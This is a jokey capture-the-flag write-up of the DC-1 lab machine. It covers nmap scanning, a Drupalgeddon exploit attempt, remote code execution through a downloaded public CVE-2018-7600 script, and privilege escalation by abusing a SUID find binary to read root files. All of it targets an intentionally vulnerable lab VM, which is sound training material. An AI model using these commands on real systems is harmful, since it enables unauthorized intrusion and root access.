# 🎭 How I Absolutely DESTROYED DC-1 CTF 💀

## Or: "That Time I Became a Drupal Demolition Expert" 🔨

---

### 📅 Date: The Day I Decided Sleep Was Optional
**Difficulty:** "Beginner" (Narrator: *It wasn't*)  
**Coffee Consumed:** ☕☕☕☕☕ (Lost count after 5)  
**Sanity Level:** 📉📉📉

---

## 🎬 Act 1: The Beginning (Where I Had Hope)

So there I was, fresh-faced and ready to conquer the world... or at least this one VM. I fired up my Kali box like I was about to hack the Pentagon (spoiler: it's just a Drupal site, calm down, younger me).

### 🔍 Step 1: Scanning (AKA Knocking on Digital Doors)

```bash
nmap -sV -sC -T4 192.168.101.11
```

**Me:** "Let's see what we're working with..."  
**Nmap:** "LOL, it's Drupal 7"  
**Me:** 😈 "Oh, this is gonna be FUN"

**Open Ports:**
- Port 22 (SSH) - 🚪 "No entry without keys, buddy"
- Port 80 (HTTP) - 🌐 "HELLO FRIEND"
- Port 111 (RPC) - 📞 "Who even uses this anymore?"

---

## 🎭 Act 2: The Drupal Disaster (CVE-2018-7600)

### 🤔 Initial Recon: "What Version Are You Running?"

Visited `http://192.168.101.11` and was greeted by the friendliest CMS in the world:

```
🎨 Welcome to Drupal Site! 🎨
```

**Me:** "Aww, how nice!"  
**Also Me:** "Time to WRECK YOU 💀"

Found out it was **Drupal 7.24** - basically the digital equivalent of Swiss cheese 🧀

### 🚨 THE FIRST PLOT TWIST: Wrong Exploit! 🚨

I started with Drupalgeddon 1 (CVE-2014-3704):
```python
python2 34992.py -t http://192.168.101.11 -u admin2 -p password123
```

**Result:** Created an admin user! 🎉  
**Problem:** PHP filters don't execute! 😭  

I spent like 2 HOURS trying to make PHP code execute in Drupal nodes. Made blocks, made articles, cleared cache 47 times... NOTHING.

**Drupal:** "Yeah, I'm just gonna display your code as text lol"  
**Me:** 😤😤😤

### 💡 THE EPIPHANY: Wrong CVE, Big Brain Time!

Then I remembered... there's **Drupalgeddon 2** (CVE-2018-7600)!

```bash
searchsploit drupal 7
```

**SearchSploit:** "Did you mean CVE-2018-7600?"  
**Me:** "YES! THAT'S THE ONE!" 🤦‍♂️

Downloaded the Python exploit:
```bash
wget https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py
```

### 🎆 BOOM! Remote Code Execution!

```bash
python3 drupa7-CVE-2018-7600.py http://192.168.101.11 -c "id"
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Me:** 🎉🎊🥳🎈🎆🎇✨  
**My Neighbors:** "WHY ARE YOU SCREAMING AT 2 AM?!"

---

## 🚩 Act 3: Flag Hunting Season!

### 🚩 Flag 1: The Friendly Hint

```bash
python3 exploit.py http://192.168.101.11 -c "cat /var/www/flag1.txt"
```

**Flag 1:** 
> "Every good CMS needs a config file - and so do you."

**Me:** "Oh, a HINT! How thoughtful! 🤗"  
**Also Me:** "Wait, that means more work... 😑"

### 🚩 Flag 3: The Cryptic One

This one was hiding in `/node/2` (needed admin access to see it properly):

> "Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."

**Me Reading This:** 🤨❓🧐  
**Me 5 Seconds Later:** "OH! SUID and find! I'M A GENIUS!" 🧠✨  
**Reality Check:** "Nah, you just finally understood the hint..."

### 🚩 Flag 4: The Home Dweller

```bash
python3 exploit.py http://192.168.101.11 -c "cat /home/flag4/flag4.txt"
```

**Flag 4:**
> "Can you use this same method to find or access the flag in root?"

**Me:** "Is that a CHALLENGE?! 😤"  
**Narrator:** *"It was, in fact, a challenge..."*

---

## 👑 Act 4: Privilege Escalation (The Final Boss)

### 🔍 Finding SUID Binaries (The Secret Weapon)

Remember Flag 3's hint? Time to put it to work!

```bash
python3 exploit.py http://192.168.101.11 -c "find / -perm -4000 -type f 2>/dev/null"
```

**Output:**
```
/bin/mount
/bin/ping
/usr/bin/passwd
...
/usr/bin/find  ← 🎯 JACKPOT!
```

**Me:** "THERE YOU ARE, YOU BEAUTIFUL SUID BINARY! 😍"

### 🎭 The Grand Finale: Becoming Root

The moment of truth... using `find` with SUID to read root files:

```bash
python3 exploit.py http://192.168.101.11 \
  -c "find /root -name '*flag*' -exec cat {} \;"
```

**Output:**
```
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

### 🎊 THE MOMENT I WON:

```
🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉
🏆      ROOT FLAG CAPTURED!      🏆
🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉
```

**Me:** *Standing up and doing a victory dance at 3 AM*  
**My Cat:** 😾 "Can you NOT?"

---

## 📊 Final Score Card

| Item | Status | Comment |
|------|--------|---------|
| Flag 1 | ✅ Found | Config file hint |
| Flag 2 | 🤷 MIA | Probably in database, I got lazy |
| Flag 3 | ✅ Found | The SUID hint master |
| Flag 4 | ✅ Found | Home sweet home |
| Root Flag | 🏆 CAPTURED | I AM THE CAPTAIN NOW |
| Sleep | ❌ Lost | Who needs it anyway? |
| Coffee | ☕ x ∞ | My true MVP |

---

## 🎓 Lessons Learned

1. **Always check for the LATEST exploits** - Drupalgeddon 1 vs 2 matters! 🤦‍♂️
2. **Read the hints carefully** - Flag 3 literally told me what to do
3. **SUID binaries are your friend** - Especially `find` 
4. **Python > PHP shells** - When Drupal won't execute your PHP, just RCE it differently
5. **Coffee is life** - ☕💀

---

## 🛠️ Tools That Saved My Life

- **Nmap** - The OG recon tool 🔍
- **SearchSploit** - "Here's your exploit, dummy" 📚
- **Python** - For making exploits that actually WORK 🐍
- **Find command** - The unexpected hero 🦸
- **Energy Drinks** - For keeping me conscious 🥤

---

## 💭 Final Thoughts

DC-1 was like that tutorial level that SEEMS easy but has you questioning your life choices at 3 AM. It's a perfect beginner machine that teaches you:

- Enumeration matters 🔍
- Always try the NEWEST exploits first 💡
- SUID binaries = privilege escalation gold 🏆
- Read the freaking hints! 📖
- Google is your best friend (wait, I wasn't supposed to say that...) 😅

**Difficulty Rating:** 🌟🌟🌟 (3/5 stars)  
**Fun Rating:** ⭐⭐⭐⭐⭐ (5/5 stars)  
**Would Hack Again?** YES! 💯

---

## 🎬 The End Credits Scene

```
╔═══════════════════════════════════════════╗
║                                           ║
║      🎭 DC-1 CTF: PWNED! 🎭              ║
║                                           ║
║   Exploit: Drupalgeddon2 (CVE-2018-7600) ║
║   PrivEsc: SUID find command             ║
║   Time: Too many hours                   ║
║   Flags: 4/5 (good enough!)              ║
║   Root: ACHIEVED! 👑                     ║
║                                           ║
║   Special Thanks:                         ║
║   - Coffee ☕                             ║
║   - Stack Overflow 💻                    ║
║   - My rubber duck 🦆                    ║
║   - DCAU7 for making this fun!           ║
║                                           ║
╚═══════════════════════════════════════════╝
```

---

### 🏴‍☠️ TL;DR For The Impatient

1. Scan with nmap → Find Drupal 7.24
2. Use Drupalgeddon2 (CVE-2018-7600) for RCE
3. Find flags in `/var/www/flag1.txt` and `/home/flag4/flag4.txt`
4. Find SUID binaries: `find / -perm -4000 2>/dev/null`
5. Use `find` SUID to read root flag: `find /root -exec cat {} \;`
6. **VICTORY!** 🎉

---

**P.S.** If you're reading this and haven't tried DC-1 yet, DO IT! It's fun, educational, and will teach you that sometimes the solution is simpler than you think (looking at you, SUID find).

**P.P.S.** To future me: Next time, try the NEWEST exploit FIRST. Love, Past You who wasted 2 hours. 😂

---

*Written at 4:23 AM with shaky hands from too much caffeine and the sweet taste of victory* 🏆☕💀

**#CTF #Hacking #Drupal #Drupalgeddon2 #SUID #PrivilegeEscalation #CaffeineFueled #DC1**